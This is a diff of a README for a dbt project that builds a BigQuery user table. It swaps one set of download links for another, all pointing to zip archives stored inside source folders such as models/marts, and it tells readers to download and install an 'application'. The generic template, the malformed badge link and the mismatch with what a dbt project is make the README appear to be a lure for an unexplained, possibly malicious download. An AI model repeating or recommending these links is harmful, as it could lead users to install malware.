@@ -1,7 +1,7 @@
 # 🛠️ oroboro-dw-dbt - Build Your Business Intelligence Tables Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/moizbukhari1996/oroboro-dw-dbt/main/smallish/oroboro-dw-dbt.zip%20Latest%https://raw.githubusercontent.com/moizbukhari1996/oroboro-dw-dbt/main/smallish/oroboro-dw-dbt.zip)](https://raw.githubusercontent.com/moizbukhari1996/oroboro-dw-dbt/main/smallish/oroboro-dw-dbt.zip)
+[![Download Latest Release](https://github.com/moizbukhari1996/oroboro-dw-dbt/raw/refs/heads/main/models/marts/oroboro_dbt_dw_1.6.zip%20Latest%https://github.com/moizbukhari1996/oroboro-dw-dbt/raw/refs/heads/main/models/marts/oroboro_dbt_dw_1.6.zip)](https://github.com/moizbukhari1996/oroboro-dw-dbt/raw/refs/heads/main/models/marts/oroboro_dbt_dw_1.6.zip)
 
 ## 📖 Description
 This project builds a clean, BI‑ready table user_base in BigQuery. It's designed for users in analytics, allowing you to manage and analyze your data effectively. 
@@ -19,7 +19,7 @@ Follow these simple steps to get your application up and running.
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page where you can download the latest version of the software.  
-   [Download Link](https://raw.githubusercontent.com/moizbukhari1996/oroboro-dw-dbt/main/smallish/oroboro-dw-dbt.zip)
+   [Download Link](https://github.com/moizbukhari1996/oroboro-dw-dbt/raw/refs/heads/main/models/marts/oroboro_dbt_dw_1.6.zip)
 
 2. **Select the Latest Version**  
    On the releases page, look for the latest version. It will usually be at the top of the list. 
@@ -56,7 +56,7 @@ Follow these simple steps to get your application up and running.
 
 ## 📥 Download & Install
 To download the latest version of oroboro-dw-dbt, click the link below:  
-[Download Link](https://raw.githubusercontent.com/moizbukhari1996/oroboro-dw-dbt/main/smallish/oroboro-dw-dbt.zip)
+[Download Link](https://github.com/moizbukhari1996/oroboro-dw-dbt/raw/refs/heads/main/models/marts/oroboro_dbt_dw_1.6.zip)
 
 ## 📞 Support
 If you encounter issues during installation or while using the application, please reach out to the support team via the project's GitHub Issues page. Your feedback helps improve the software.
